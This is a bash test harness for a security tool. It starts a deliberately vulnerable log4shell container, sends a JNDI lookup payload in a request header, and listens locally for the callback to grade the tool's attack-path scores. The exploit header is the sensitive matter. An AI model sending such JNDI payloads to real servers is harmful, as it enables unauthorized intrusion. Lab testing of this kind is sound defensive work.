#!/usr/bin/env bash
#
# validate-harness.sh - a repeatable real-verdict harness for the calibration loop.
#
# It closes the loop on REAL data, without the circularity of a target you wrote
# yourself: it brings up a genuinely-exploitable log4shell app, has PerspectiveGraph
# surface the internet -> sensitive-asset path, then EXPLOITS the live app and takes
# the verdict from an INDEPENDENT oracle - did the app actually make the JNDI
# callback? A callback = confirmed; no callback (patched / blocked / not vulnerable)
# = refuted. Either way the verdict is recorded with the path's server-captured
# predicted score, so the calibration report grades a genuine outcome.
#
#   make validate-harness                    # default log4shell scenario
#   TARGET_IMAGE=... EXPLOIT_HEADER=... make validate-harness   # point at another target
#
# Requirements: docker, curl, jq, python3, and the PerspectiveGraph stack up
# (`make up-full`). Trivy is optional (a saved report is the fallback).
#
# One run yields ONE verdict. Calibration needs volume AND both confirmed and
# refuted across the score range - run it repeatedly, and point it at a PATCHED
# image (TARGET_IMAGE=...) to harvest honest `refuted` verdicts too.
set -euo pipefail

# ── Config (override via env) ────────────────────────────────────────
TARGET_IMAGE=${TARGET_IMAGE:-ghcr.io/christophetd/log4shell-vulnerable-app:latest}
TARGET_PORT=${TARGET_PORT:-8888}          # host port -> the app's :8080
TARGET_INNER_PORT=${TARGET_INNER_PORT:-8080}
CALLBACK_PORT=${CALLBACK_PORT:-1389}      # where the app's JNDI lookup calls back
INGEST_URL=${INGEST_URL:-http://localhost:8081}
API_URL=${API_URL:-http://localhost:8080}
JEWEL=${JEWEL:-"secrets-vault (sensitive asset)"}   # the sensitive-asset node name (vary it for a distinct sample)
ENTRY=${ENTRY:-"internet-lb (log4shell demo)"}      # the internet entry node name
MITIGATED=${MITIGATED:-}                  # non-empty ⇒ run the target in mitigated mode (LOG4J_FORMAT_MSG_NO_LOOKUPS) to harvest an honest `refuted`
ANALYZER_WAIT=${ANALYZER_WAIT:-35}        # seconds to let a pass run
ORACLE_TIMEOUT=${ORACLE_TIMEOUT:-15}      # seconds to wait for the JNDI callback
# The header that triggers the vulnerable log4j lookup on the default app. The
# ${jndi:...} must reach the app LITERALLY, so it is single-quoted here.
EXPLOIT_HEADER=${EXPLOIT_HEADER:-'X-Api-Version: ${jndi:ldap://host.docker.internal:'"$CALLBACK_PORT"'/pg}'}

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
CONTAINER="pg-harness-target"
GO=${GO:-go}; export GOTOOLCHAIN=${GOTOOLCHAIN:-go1.25.11}

say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
ok()   { printf '  \033[32mok\033[0m %s\n' "$*"; }
warn() { printf '  \033[33m!\033[0m  %s\n' "$*"; }
die()  { printf '  \033[31mx\033[0m  %s\n' "$*" >&2; exit 1; }

cleanup() {
  docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
  [ -n "${ORACLE_PID:-}" ] && kill "$ORACLE_PID" >/dev/null 2>&1 || true
  rm -rf "$TMP"
}
trap cleanup EXIT

# ── 0. Preconditions ─────────────────────────────────────────────────
say "0. preconditions"
for b in docker curl jq python3; do command -v "$b" >/dev/null 2>&1 || die "$b not found"; done
curl -sf "$API_URL/healthz"    >/dev/null 2>&1 || die "API unreachable at $API_URL (run: make up-full)"
curl -sf "$INGEST_URL/healthz" >/dev/null 2>&1 || die "ingest unreachable at $INGEST_URL (run: make up-full)"
ok "stack is up"

# ── 1. Bring up the genuinely-vulnerable target ──────────────────────
say "1. start the vulnerable target ($TARGET_IMAGE)"
docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
docker run -d --rm --name "$CONTAINER" \
  --add-host=host.docker.internal:host-gateway \
  ${MITIGATED:+-e LOG4J_FORMAT_MSG_NO_LOOKUPS=true} \
  -p "${TARGET_PORT}:${TARGET_INNER_PORT}" "$TARGET_IMAGE" >/dev/null \
  || die "could not start $TARGET_IMAGE (can you pull it? try: docker pull $TARGET_IMAGE)"
[ -n "$MITIGATED" ] && warn "MITIGATED mode: the app runs with the log4j lookup disabled - expect a REFUTED verdict at a high predicted score"
for i in $(seq 1 30); do
  curl -s -o /dev/null "http://localhost:${TARGET_PORT}/" && { ok "target up on :$TARGET_PORT"; break; }
  [ "$i" = 30 ] && die "target did not become reachable on :$TARGET_PORT"
  sleep 1
done

# ── 2. Ingest so the engine surfaces the path ────────────────────────
say "2. ingest the vulnerable image -> PerspectiveGraph surfaces the path"
$GO build -o "$TMP/pg" "$ROOT/backend/cmd/perspectivegraph" 2>/dev/null \
  || (cd "$ROOT/backend" && $GO build -o "$TMP/pg" ./cmd/perspectivegraph) \
  || die "failed to build the perspectivegraph CLI"
SRC=(--jewel "$JEWEL" --entry "$ENTRY")
if command -v trivy >/dev/null 2>&1; then
  "$TMP/pg" ingestreal --ingest "$INGEST_URL" --image "$TARGET_IMAGE" "${SRC[@]}" || die "ingestreal (trivy scan) failed"
else
  warn "trivy not found - using the saved log4shell report (CVE is identical)"
  "$TMP/pg" ingestreal --ingest "$INGEST_URL" --report "$ROOT/backend/testdata/log4shell-trivy-sample.json" "${SRC[@]}" \
    || die "ingestreal (saved report) failed"
fi

# ── 3. Wait for a pass and confirm the path exists ───────────────────
say "3. wait ${ANALYZER_WAIT}s for an analyzer pass, verify the path formed"
sleep "$ANALYZER_WAIT"
PATHS=$(curl -s -X POST "$API_URL/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{ attackPaths { id score priority nodes { name } } }"}')
MATCH=$(echo "$PATHS" | jq -r --arg j "$JEWEL" --arg e "$ENTRY" \
  '.data.attackPaths[] | select((.nodes[-1].name|ascii_downcase|contains($j|ascii_downcase)) and (.nodes[0].name|ascii_downcase|contains($e|ascii_downcase))) | "\(.id) score=\(.score) prio=\(.priority)"' | head -1)
[ -n "$MATCH" ] || die "no attack path to '$JEWEL' from '$ENTRY' yet - give it longer (ANALYZER_WAIT) or check the ingest"
ok "engine surfaced the path: $MATCH"
PRED=$(echo "$MATCH" | sed -E 's/.*score=([0-9.]+).*/\1/')

# ── 4. Exploit the LIVE app; take the verdict from the callback oracle ─
say "4. exploit the live app - independent oracle: did it call back?"
# One-shot TCP listener: exit 0 if it accepts a connection within the timeout, else 1.
python3 - "$CALLBACK_PORT" "$ORACLE_TIMEOUT" >"$TMP/oracle.out" 2>&1 <<'PY' &
import socket, sys
port, timeout = int(sys.argv[1]), int(sys.argv[2])
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", port)); s.listen(1); s.settimeout(timeout)
try:
    c, a = s.accept(); print("callback from", a[0]); sys.exit(0)
except socket.timeout:
    print("no callback within %ss" % timeout); sys.exit(1)
PY
ORACLE_PID=$!
sleep 1  # let the listener bind
warn "firing: curl http://localhost:${TARGET_PORT}/  -H '${EXPLOIT_HEADER%%:*}: \${jndi:ldap://host.docker.internal:${CALLBACK_PORT}/pg}'"
curl -s -m 6 "http://localhost:${TARGET_PORT}/" -H "$EXPLOIT_HEADER" >/dev/null 2>&1 || true

if wait "$ORACLE_PID"; then OUTCOME=confirmed; else OUTCOME=refuted; fi
ORACLE_PID=""
ORACLE_MSG=$(cat "$TMP/oracle.out" 2>/dev/null || true)
if [ "$OUTCOME" = confirmed ]; then ok "CONFIRMED - $ORACLE_MSG (the app is genuinely exploitable)"
else warn "REFUTED - $ORACLE_MSG (no live exploitation: patched / blocked / not vulnerable)"; fi

# ── 5. Record the verdict with its server-captured predicted score ───
say "5. record the real verdict -> calibration"
BEFORE=$(curl -s "$API_URL/validations" | jq -c '.calibration | {samples,verdict}')
cat > "$TMP/report.json" <<JSON
{ "source": "validate-harness",
  "findings": [
    { "target": "$JEWEL", "from": "$ENTRY", "scope": "path", "outcome": "$OUTCOME",
      "evidence": "live log4shell exploit attempt: ${ORACLE_MSG}" }
  ] }
JSON
"$TMP/pg" importverdicts --file "$TMP/report.json" --api "$API_URL"

# ── 6. Show the calibration delta ────────────────────────────────────
say "6. calibration after this run"
echo "  predicted score for the tested path: ${PRED:-?}   observed: $OUTCOME"
echo "  before: $BEFORE"
AFTER=$(curl -s "$API_URL/validations")
echo "$AFTER" | jq -c '{metrics: .metrics, calibration: (.calibration | {samples,verdict,diagnosis,persistent})}'
echo
ok "done. A verdict is deduped per (path, scope), so re-running the SAME scenario refreshes this path's verdict rather than adding a sample. For volume, vary TARGET_IMAGE / point at different targets; for honest 'refuted' verdicts, aim it at a patched build."
[ "$(echo "$AFTER" | jq -r '.calibration.persistent')" = "true" ] \
  || warn "the backend has no VALIDATIONS_PATH - verdicts are in-memory and lost on restart. Set it for a real calibration program."
